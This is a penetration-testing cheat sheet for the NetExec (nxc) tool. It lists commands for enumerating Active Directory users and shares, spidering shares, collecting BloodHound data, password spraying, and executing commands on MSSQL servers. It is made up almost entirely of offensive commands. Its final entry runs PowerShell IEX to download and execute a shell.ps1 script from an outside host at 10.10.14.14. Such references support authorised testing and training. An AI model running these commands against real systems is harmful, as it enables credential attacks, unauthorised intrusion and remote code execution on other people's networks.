# Netexec (nxc)

## [Installation](https://www.netexec.wiki/getting-started/installation)

## Recon
* Verify Credentials
  ```bash
  nxc smb <dc hname> -u <user> -p <password>
  ```
* Enumerate users
  ```bash
  nxc smb <dc hname> -u <user> -p <password> --users
  ```
  Create a user list
  - Copy output to a .txt file
  ```bash
  cat <users.txt> |awk '{print $5}' > userlist.txt
  ```
* Enumerate Shares
  ```bash
  nxc smb <dc hname> -u <user> -p <password> --shares
  ```
  ```bash
  # Spidering shares (Exluces print$, ipc$, NETLOGON, SYSVOL
  nxc smb <dc hname> -u <user> -p <password> -M spider_plus -o EXCLUDE_FILTER='print$,NETLOGON,SYSVOL,ipc$'
  ```
  ```bash
  # Parse the resulting json file
  cat <filename> | jq '. | map_values(keys)'|grep -v 'lnk\|ini'
  ```
* Bloodhound Collection
  ```bash
  nxc ldap <dc hname> -u <user> -p <password> --bloodhound --collection All --dns-server <DNS IP>
  ```
* Password Spray
  ```bash
  nxc smb <hname or ip> -u <users.txt> -p <password_to_test> --continue-on-success
  ```

## SQL
* Run commands
  ```bash
  nxc mssql <hname> -u <user> -p <password> -x $command
  ```
  ```bash
  # Run powershell commands by capitalizing the "x"
  nxc mssql <hname> -u <user> -p <password> -X $command
  ```
  If you get an error about an untrusted domain and integrated authentication, use the `--local-auth` tag
* Download a file
  ```bash
  nxc mssql <hname> -u <user> -p <pass> --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.14:8000/shell.ps1")'
  ```

